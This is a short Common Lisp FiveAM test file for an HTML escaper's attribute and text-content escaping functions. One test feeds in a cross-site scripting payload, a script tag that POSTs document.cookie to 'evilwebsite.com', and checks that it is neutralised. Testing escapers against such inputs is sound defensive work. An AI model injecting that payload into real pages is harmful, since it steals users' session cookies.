(defpackage #:hsx-test/escaper
  (:use #:cl
        #:fiveam
        #:hsx/escaper))
(in-package #:hsx-test/escaper)

(def-suite escaper-test)
(in-suite escaper-test)

(test escape-html-attribute
  (is (equal "&quot;foo&quot;"
             (escape-html-attribute "\"foo\""))))

(test escape-html-text-content
  (is (string= "&amp;&lt;&gt;&quot;&#x27;&#x2F;&grave;&#x3D;"
               (escape-html-text-content "&<>\"'/`=")))
  (is (string=
       "&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;"
       (escape-html-text-content
        "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>" ))))
